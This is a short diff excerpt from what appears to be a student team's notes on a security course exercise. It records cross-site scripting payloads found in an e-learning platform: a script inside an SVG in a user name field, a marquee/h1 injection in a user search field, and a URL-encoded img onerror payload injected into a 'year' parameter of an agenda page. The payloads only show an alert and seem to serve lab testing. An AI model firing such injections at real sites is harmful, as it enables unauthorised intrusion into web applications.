@@ -117,7 +117,9 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 	---> Αναζήτηση Χρήστη
 		---> Επώνυμο/Όνομα/Όνομα χρήστη
 			'">><marquee><h1>XSS</h1></marquee>
-			
+	
+	
+http://the-intruders.csec.chatzi.org/modules/agenda/myagenda.php?month=10&year=2030%27--%3E%3C!--%20---%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E	
 --------------------------------------------------------------------------------------------------------
 
 THANOS:
